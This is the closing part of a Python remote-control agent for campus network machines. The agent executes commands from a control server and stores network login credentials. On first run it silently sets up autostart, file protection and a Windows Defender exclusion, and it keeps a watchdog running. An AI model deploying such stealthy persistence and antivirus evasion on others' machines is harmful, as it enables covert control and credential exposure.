                S(1, 4, "接收卸载指令")
                S(2, 4, "执行完全卸载: 停止进程 + 删除文件 + 清理注册表...")
                success, message = full_uninstall()
                S(3, 4, message, "ok" if success else "error")
                S(4, 4, "Agent 即将退出...", "ok")
                http_post(f"{self.server_url}/api/report", {
                    "agent_id": self.agent_id, "cmd_id": cmd_id,
                    "success": success, "message": message,
                })
                print("  [卸载] Agent 即将退出...")
                os._exit(0)
                
            else:
                S(1, 1, f"未知命令: {command}", "error")
                message = f"未知命令: {command}"
                
        except Exception as e:
            message = f"执行异常: {e}"
            traceback.print_exc()
            S(0, 0, f"❌ 异常: {e}", "error")
        
        # 回报最终结果
        print(f"  [RES] {command}: {'✓' if success else '✗'} {message}")
        http_post(f"{self.server_url}/api/report", {
            "agent_id": self.agent_id,
            "cmd_id": cmd_id,
            "success": success,
            "message": message,
        })

    def _save_credentials(self):
        self.cfg["username"] = self.net.username
        self.cfg["password"] = self.net.password
        self.cfg["user_index"] = self.net.user_index
        self.cfg["server"] = self.server_url
        save_config(self.cfg)

    def run(self):
        """主循环"""
        print("=" * 50)
        print(f"  校园网远程控制 - Agent v{AGENT_VERSION}")
        print("=" * 50)
        print(f"  Agent ID : {self.agent_id}")
        print(f"  主机名   : {self.hostname}")
        print(f"  MAC      : {self.mac}")
        print(f"  本机 IP  : {get_local_ip()}")
        print(f"  服务器   : {self.server_url}")
        print(f"  用户名   : {self.net.username or '(未设置)'}")
        print("=" * 50)
        
        # 清理上次更新留下的旧版本
        _cleanup_old_exe()
        
        # 检查 DNS 断网是否已过期需要恢复 (启动时用 self 以便上报)
        if _check_dns_restore(self):
            print("  ✓ 已恢复过期的 DNS 断网设置")
        
        # 每次启动都刷新自启注册 (修复路径变化/被清理的情况)
        try:
            ok, msg = enable_autostart()
            print(f"  {'✓' if ok else '✗'} 自启守护: {msg}")
        except Exception as e:
            print(f"  ✗ 自启守护异常: {e}")
        
        # 自动启动看门狗
        if not getattr(self, '_no_watchdog', False):
            try:
                _start_watchdog()
                print("  ✓ 看门狗已启动")
            except Exception as e:
                print(f"  ✗ 看门狗启动失败: {e}")
        
        print("  Agent 运行中... (Ctrl+C 停止)\n")
        
        # 注册关机/退出回调
        self._shutdown_reported = False
        import atexit
        atexit.register(self._on_shutdown)
        if platform.system() == "Windows":
            try:
                import ctypes
                @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_uint)
                def _console_handler(event):
                    # CTRL_CLOSE_EVENT=2, CTRL_LOGOFF_EVENT=5, CTRL_SHUTDOWN_EVENT=6
                    if event in (2, 5, 6):
                        self._on_shutdown(event)
                    return 0
                self._handler_ref = _console_handler  # prevent GC
                ctypes.windll.kernel32.SetConsoleCtrlHandler(_console_handler, True)
            except:
                pass
        
        # 首次心跳: 上报开机事件
        self._report_boot = True
        
        while True:
            try:
                # DNS 兜底守护: 每轮检查是否有到期的 DNS 断网需要恢复
                try:
                    _check_dns_restore(self)
                except Exception as e:
                    print(f"  [DNS守护] 异常: {e}")
                self.heartbeat()
            except KeyboardInterrupt:
                print("\n  Agent 已停止")
                self._on_shutdown()
                break
            except Exception as e:
                print(f"  [ERR] {e}")
            time.sleep(HEARTBEAT_INTERVAL)


# ============ 入口 ============

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="校园网远程控制 Agent")
    parser.add_argument("--server", default=None, help="控制面板地址")
    parser.add_argument("--portal", default=None, help="Portal IP")
    parser.add_argument("--no-autostart", action="store_true", help="跳过自动设置开机自启")
    parser.add_argument("--no-protect", action="store_true", help="跳过文件防护")
    parser.add_argument("--no-watchdog", action="store_true", help="禁用看门狗")
    args = parser.parse_args()

    # 首次运行: 静默自动配置 (开机自启 + 文件防护 + Defender白名单)
    cfg = load_config()
    if not cfg.get("_installed"):
        print("  [安装] 首次运行，自动配置...")
        if not args.no_autostart:
            ok, msg = enable_autostart()
            print(f"  {'✓' if ok else '✗'} 自启: {msg}")
        if not args.no_protect:
            ok, msg = protect_files()
            print(f"  {'✓' if ok else '✗'} 防护: {msg}")
            ok, msg = add_defender_exclusion()
            print(f"  {'✓' if ok else '✗'} 白名单: {msg}")
        cfg["_installed"] = True
        cfg["server"] = DEFAULT_SERVER
        save_config(cfg)

    agent = Agent(server_url=args.server)
    agent._no_watchdog = args.no_watchdog
    
    if args.portal:
        agent.net.portal_ip = args.portal
        agent.net.base_url = f"http://{args.portal}"
    
    agent.run()
